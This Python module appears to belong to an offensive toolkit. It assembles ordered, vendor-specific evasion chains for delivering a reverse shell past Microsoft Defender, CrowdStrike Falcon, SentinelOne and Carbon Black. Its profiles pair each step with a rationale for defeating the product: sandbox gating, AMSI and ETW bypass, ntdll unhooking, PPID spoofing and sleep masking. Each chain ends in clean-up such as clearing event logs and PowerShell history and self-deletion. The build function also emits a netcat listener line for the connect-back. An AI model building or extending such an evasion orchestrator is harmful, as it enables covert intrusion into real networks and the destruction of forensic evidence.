"""
EDR-aware evasion stack orchestrator.

Given a target EDR and a payload spec, return an ordered sequence of evasion
techniques optimised for that vendor. Each entry includes the actual generated
command + a rationale explaining why it's in the chain.

Operator workflow:
    POST /stack {"edr": "crowdstrike", "lhost": "...", "lport": 4444, "language": "powershell"}
    → ordered chain that defeats CrowdStrike Falcon's known telemetry
      (user-mode hooks, kernel ETW, memory scanner).

The profiles are opinionated based on public research and disclosed vendor
internals (Defender for Endpoint, CrowdStrike Falcon, SentinelOne Singularity,
VMware Carbon Black). Update as vendors evolve.
"""
import dataclasses
from dataclasses import dataclass, field

from .evasion import generate_evasion

SUPPORTED_EDRS = ("defender", "crowdstrike", "sentinelone", "carbonblack", "generic")


@dataclass
class StackEntry:
    step: int
    module: str           # always "evasion" / "anti_forensics" / "sandbox_evasion" / "shell"
    technique: str
    command: str
    rationale: str
    techniques: list[str] = field(default_factory=list)
    risk: str = "HIGH"


@dataclass
class EvasionStackResult:
    edr: str
    listener: str         # operator's listener setup hint
    chain: list[StackEntry]
    total_steps: int
    summary: str


# ── Per-EDR profile recipes ──────────────────────────────────────────────────
#
# Each profile is a list of (technique, rationale). The "shell" pseudo-technique
# is replaced with the actual generated payload at stack-build time. Order is
# load-bearing — sandbox gates first, environmental tampering second, payload
# next, cleanup last.

_PROFILES: dict[str, list[tuple[str, str]]] = {
    "defender": [
        # Defender for Endpoint relies heavily on AMSI + WLDP + ETW. Patchless
        # bypasses outperform byte-patching because DFE's image-integrity scan
        # flags amsi.dll / ntdll.dll drift.
        ("sandbox_check_uptime",  "DFE submits suspicious binaries to cloud sandboxes — gate on uptime to skip them"),
        ("sandbox_check_domain_joined", "DFE customers are corporate; non-domain-joined hosts are probably sandboxes"),
        ("vm_detect_wmi",         "Defender Cloud sandboxes show Microsoft Corporation Hyper-V"),
        ("amsi_hwbp",             "Patchless AMSI bypass — DFE's amsi.dll integrity scan can't detect it"),
        ("etw_hwbp",              "Patchless ETW silencing — defeats DFE's behavioural telemetry per-process"),
        ("amsi_wldp_downgrade",   "WLDP policy downgrade — necessary for unsigned script content"),
        ("ntdll_unhook",          "DFE installs userland hooks via MsMpEng; refresh from disk to wipe them"),
        ("ppid_spoof",            "DFE rule 'Office spawning PowerShell' is its top phishing detection — spoof to explorer"),
        ("shell",                 "Reverse shell payload"),
        ("clear_powershell_history", "DFE's investigation timeline pulls PSReadLine first"),
        ("clear_event_logs",      "DFE Cloud uses Security/PowerShell logs for retro-hunt — final cleanup"),
    ],
    "crowdstrike": [
        # CrowdStrike Falcon's strength is kernel ETW + heavy callstack inspection.
        # The big wins are indirect syscalls (clean callstacks) + memory integrity
        # bypass (Falcon scans every thread start).
        ("sandbox_check_user_interaction", "Falcon Sandbox doesn't simulate mouse movement; gate on it"),
        ("sandbox_check_uptime",  "Falcon's pre-execution scan in cloud takes ~3 min; gate on 20+ min uptime"),
        ("vm_detect_artifacts",   "Falcon Sandbox runs in VMware; check for VMware artifacts"),
        ("indirect_syscalls",     "Falcon's userland hooks AND callstack inspection — indirect syscalls land inside ntdll.dll"),
        ("etw_hwbp",              "Falcon ingests ETW Threat-Intel; patchless silence beats it"),
        ("rop_sleep",             "Falcon snapshots memory during sleep — ROP sleep mask defeats the scanner"),
        ("early_bird_apc",        "Falcon hooks load AFTER ntdll init; Early Bird fires before hooks are in place"),
        ("shell",                 "Reverse shell payload"),
        ("clear_event_logs",      "Falcon also ingests Windows event logs — wipe at end"),
    ],
    "sentinelone": [
        # SentinelOne Singularity uses Active EDR with strong process-tree inspection
        # and a memory scanner that runs every 30 seconds.
        ("sandbox_check_ram",     "S1's cloud sandbox runs 2GB VMs — gate on ≥8GB"),
        ("sandbox_check_uptime",  "S1 dynamic analysis is short; skip with uptime gate"),
        ("vm_detect_wmi",         "S1 Sandbox manifests as 'innotek GmbH VirtualBox'"),
        ("amsi_hwbp",             "S1 hooks AMSI via its own provider; patchless bypass routes around it"),
        ("ntdll_unhook",          "S1's behavioural engine relies on user-mode hooks; unhook neutralises it"),
        ("rop_sleep",             "S1 runs a memory scanner every 30s; ROP sleep keeps the beacon encrypted"),
        ("ppid_spoof",            "S1's process-tree visualisation surfaces 'powershell from word'; spoof parent"),
        ("module_stomping",       "S1 inspects new image regions; stomping reuses signed image space"),
        ("shell",                 "Reverse shell payload"),
        ("self_delete",           "S1 forensic export pulls all dropped files; self-delete to reduce evidence"),
    ],
    "carbonblack": [
        # VMware Carbon Black Cloud (formerly Cb Defense). Strong on process-tree
        # rules + reputation feeds; weaker on patchless memory-integrity scans.
        ("sandbox_check_domain_joined", "Cb deployments are enterprise; non-domain skip handles personal/sandbox"),
        ("vm_detect_wmi",         "Cb Sandbox uses VMware; detect via Manufacturer string"),
        ("amsi_reflection",       "Cb's AMSI integration is older; reflection bypass usually works"),
        ("etw_patch",             "Cb's per-process ETW collection — byte-patch is sufficient here"),
        ("dll_sideload",          "Cb's reputation feed allows signed binaries; sideload via OneDrive.exe or similar"),
        ("ppid_spoof",            "Cb's process-tree rules are robust; PPID spoof keeps explorer.exe as the parent"),
        ("shell",                 "Reverse shell payload"),
        ("clear_jumplists",       "Cb collects JumpLists during forensic export"),
        ("clear_event_logs",      "Cb relies on Windows event logs as a secondary source"),
    ],
    "generic": [
        # Vendor-agnostic best-effort stack. Pick the techniques that work against
        # the broadest set of EDRs without over-fitting to one vendor's quirks.
        ("sandbox_check_uptime",  "Skip every cloud-sandbox vendor that uses fresh VMs"),
        ("sandbox_check_user_interaction", "Skip every analysis pipeline that doesn't simulate user input"),
        ("vm_detect_wmi",         "Catch the common hypervisor brand strings"),
        ("amsi_hwbp",             "Patchless AMSI — works against Defender, S1, Cb, and most others"),
        ("etw_hwbp",              "Patchless ETW — broad coverage"),
        ("ntdll_unhook",          "Wipe userland hooks — neutralises every EDR that relies on inline hooking"),
        ("ppid_spoof",            "Defeats the universal 'Office/PowerShell spawning' rule family"),
        ("shell",                 "Reverse shell payload"),
        ("clear_powershell_history", "First thing every IR responder looks at"),
        ("clear_event_logs",      "Wipe the Security + PowerShell logs at the end"),
    ],
}


def build_stack(
    edr: str,
    lhost: str,
    lport: int,
    language: str = "powershell",
    obfuscate: bool = True,
    include_anti_forensics: bool = True,
    include_sandbox_evasion: bool = True,
    shell_command: str | None = None,
) -> EvasionStackResult:
    """
    Build an ordered evasion stack for the given EDR.

    `shell_command` is the payload command produced by the shell generator —
    routers/stack.py builds the shell separately and passes it in so we don't
    have a circular dependency.
    """
    if edr not in _PROFILES:
        raise ValueError(f"Unknown EDR '{edr}'. Supported: {', '.join(SUPPORTED_EDRS)}")

    profile = _PROFILES[edr]
    entries: list[StackEntry] = []

    # Lookup tables — late-imported to avoid circular imports.
    from .anti_forensics import SUPPORTED_TECHNIQUES as AF_TECHS, generate_anti_forensics
    from .sandbox_evasion import SUPPORTED_TECHNIQUES as SE_TECHS, generate_sandbox_evasion
    from .evasion import SUPPORTED_TECHNIQUES as EV_TECHS

    for technique, rationale in profile:
        if technique == "shell":
            cmd = shell_command or (
                f"# operator: insert {language} reverse shell to {lhost}:{lport} here"
            )
            entries.append(StackEntry(
                step=len(entries) + 1, module="shell", technique=language,
                command=cmd, rationale=rationale,
                techniques=["T1059"], risk="HIGH",
            ))
            continue

        if technique in AF_TECHS:
            if not include_anti_forensics:
                continue
            r = generate_anti_forensics(technique, obfuscate=obfuscate)
            entries.append(StackEntry(
                step=len(entries) + 1, module="anti_forensics",
                technique=technique, command=r.command, rationale=rationale,
                techniques=r.techniques, risk=r.risk,
            ))
            continue

        if technique in SE_TECHS:
            if not include_sandbox_evasion:
                continue
            r = generate_sandbox_evasion(technique, obfuscate=obfuscate)
            entries.append(StackEntry(
                step=len(entries) + 1, module="sandbox_evasion",
                technique=technique, command=r.command, rationale=rationale,
                techniques=r.techniques, risk=r.risk,
            ))
            continue

        if technique in EV_TECHS:
            r = generate_evasion(technique, obfuscate=obfuscate, lhost=lhost, lport=lport)
            entries.append(StackEntry(
                step=len(entries) + 1, module="evasion",
                technique=technique, command=r.command, rationale=rationale,
                techniques=r.techniques, risk=r.risk,
            ))
            continue

        # Profile referenced an unknown technique — surface as a hard error so
        # we don't silently ship a stack with gaps.
        raise ValueError(f"Profile '{edr}' references unknown technique '{technique}'")

    listener = f"rlwrap nc -lvnp {lport}    # connect-back from {lhost}"
    summary = (
        f"{edr} evasion stack with {len(entries)} steps. "
        f"Payload: {language} reverse shell to {lhost}:{lport}."
    )

    return EvasionStackResult(
        edr=edr,
        listener=listener,
        chain=entries,
        total_steps=len(entries),
        summary=summary,
    )
